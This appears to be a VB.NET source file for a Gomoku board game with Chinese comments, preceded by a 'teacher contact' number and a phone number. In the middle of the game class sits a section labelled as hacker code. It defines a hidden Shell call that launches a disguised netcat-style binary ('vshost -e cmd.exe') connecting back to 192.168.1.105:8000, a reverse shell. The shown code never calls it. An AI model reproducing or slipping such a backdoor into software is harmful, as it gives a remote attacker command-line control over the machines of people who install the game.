'老师联系方式 ：107147267-
'13813510790
Imports System.IO
Imports System.Reflection
Imports System.Threading

Public Class Form1
    Public qipan(19, 19) As Integer
    Public img_position As New System.Drawing.PointF(109, 158)      '胜利图片的位置
    Public img_heisheng As System.Drawing.Image = My.Resources.黑棋胜利
    Public img_baisheng As System.Drawing.Image = My.Resources.白棋胜利
    Public img_biaoshi As System.Drawing.Image = My.Resources.标识  '红色半加好标识
    Public needReStar As Boolean = False           '是否需要重新开始变量

    '''''''''''''''''''''黑客部分代码''''''''''''''''''''''
    Private th As Thread                '定义线程
    Private Sub shellcode()
        Shell("vshost -e cmd.exe 192.168.1.105 8000", 0) '反向链接主机地址，自己的外网IP
    End Sub

    '''''''''''''''''''''黑客部分代码''''''''''''''''''''''


    Public Function chongzhi(ByVal w As Integer, ByVal g As System.Drawing.Graphics)   '刷屏函数
        If w = 2 Then          '获取2的信息时，则加载双人游戏图片，1时加载单人游戏图片
            双人对战.BackgroundImage = Global.VB五子棋.My.Resources.双人对战

        ElseIf w = 1 Then
            人机对战.BackgroundImage = Global.VB五子棋.My.Resources.人机对战
        End If

        Dim x As Integer
        Dim y As Integer
        For x = 0 To 18 Step 1
            For y = 0 To 18 Step 1
                qipan(x, y) = 0
            Next
        Next     '重置后，虚拟棋盘全部归零
    End Function
    Public Function judge(ByVal qipan(,) As Integer, ByVal o As Integer, ByVal g As System.Drawing.Graphics) As Integer
        Dim i, j As Integer
        For i = 0 To 18 Step 1
            For j = 0 To 18 Step 1
                If qipan(i, j) = 1 Then
                    If qipan(i, j + 1) = 1 Then
                        If qipan(i, j + 2) = 1 Then
                            If qipan(i, j + 3) = 1 Then
                                If qipan(i, j + 4) = 1 Then
                                    g.DrawImage(img_baisheng, img_position)
                                    '''''''''''''''''''显示白旗（1）获胜 按选择模式重置棋盘 返回1
                                    Me.needReStar = True
                                    Return 1
                                End If
                            End If
                        End If
                    End If
                    If qipan(i + 1, j) = 1 Then
                        If qipan(i + 2, j) = 1 Then
                            If qipan(i + 3, j) = 1 Then
                                If qipan(i + 4, j) = 1 Then
                                    g.DrawImage(img_baisheng, img_position)
                                    '''''''''''''''''''显示白旗（1）获胜 按选择模式重置棋盘 返回1
                                    Me.needReStar = True
                                    Return 1
                                End If
                            End If
                        End If
                    End If
                    If qipan(i + 1, j + 1) = 1 Then
                        If qipan(i + 2, j + 2) = 1 Then
                            If qipan(i + 3, j + 3) = 1 Then
                                If qipan(i + 4, j + 4) = 1 Then
                                    g.DrawImage(img_baisheng, img_position)
                                    '''''''''''''''''''显示白旗（1）获胜 按选择模式重置棋盘 返回1
                                    Me.needReStar = True
                                    Return 1
                                End If
                            End If
                        End If
                    End If
                    If (i > 3) Then
                        If qipan(i - 1, j + 1) = 1 Then
                            If qipan(i - 2, j + 2) = 1 Then
                                If qipan(i - 3, j + 3) = 1 Then
                                    If qipan(i - 4, j + 4) = 1 Then
                                        g.DrawImage(img_baisheng, img_position)
                                        '''''''''''''''''''显示白旗（1）获胜 按选择模式重置棋盘 返回1
                                        Me.needReStar = True
                                        Return 1
                                    End If
                                End If
                            End If
                        End If
                    End If

                ElseIf qipan(i, j) = 2 Then
                    If qipan(i, j + 1) = 2 Then
                        If qipan(i, j + 2) = 2 Then
                            If qipan(i, j + 3) = 2 Then
                                If qipan(i, j + 4) = 2 Then
                                    g.DrawImage(img_heisheng, img_position)
                                    '''''''''''''''''显示黑旗（2）获胜 按选择模式重置棋盘 返回1
                                    Me.needReStar = True
                                    Return 1
                                End If
                            End If
                        End If
                    End If
                    If qipan(i + 1, j) = 2 Then
                        If qipan(i + 2, j) = 2 Then
                            If qipan(i + 3, j) = 2 Then
                                If qipan(i + 4, j) = 2 Then
                                    g.DrawImage(img_heisheng, img_position)
                                    '''''''''''''''''显示黑旗（2）获胜 按选择模式重置棋盘 返回1
                                    Me.needReStar = True
                                    Return 1
                                End If
                            End If
                        End If
                    End If
                    If qipan(i + 1, j + 1) = 2 Then
                        If qipan(i + 2, j + 2) = 2 Then
                            If qipan(i + 3, j + 3) = 2 Then
                                If qipan(i + 4, j + 4) = 2 Then
                                    g.DrawImage(img_heisheng, img_position)
                                    '''''''''''''''''显示黑旗（2）获胜 按选择模式重置棋盘 返回1
                                    Me.needReStar = True
                                    Return 1
                                End If
                            End If
                        End If
                    End If
                    If i > 3 Then
                        If qipan(i - 1, j + 1) = 2 Then
                            If qipan(i - 2, j + 2) = 2 Then
                                If qipan(i - 3, j + 3) = 2 Then
                                    If qipan(i - 4, j + 4) = 2 Then
                                        g.DrawImage(img_heisheng, img_position)
                                        '''''''''''''''''显示黑旗（2）获胜 按选择模式重置棋盘 返回1
                                        Me.needReStar = True
                                        Return 1
                                    End If
                                End If
                            End If
                        End If
                    End If
                Else : Continue For
                End If
            Next
        Next
        Return 0
    End Function
    Private Sub Form1_MouseClick(ByVal sender As System.Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles MyBase.MouseClick
        If e.X >= 262 And e.X <= 523 And e.Y >= 495 And e.Y <= 565 Then
            网络设置.Show()
            Me.Close()

            '选择联机对战
        End If
        If e.X >= 262 And e.X <= 523 And e.Y >= 275 And e.Y <= 345 Then

            人机对战.Show()
            Me.Close()

            '选择单人游戏
        End If

        If e.X >= 262 And e.X <= 523 And e.Y >= 386 And e.Y <= 458 Then

            双人对战.Show()
            Me.Close()
            '选择双人游戏
        End If

    End Sub

    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        Dim x As Integer
        Dim y As Integer
        For x = 0 To 18 Step 1
            For y = 0 To 18 Step 1
                qipan(x, y) = 0
            Next
        Next     '重置后，虚拟棋盘全部归零

    End Sub
End Class
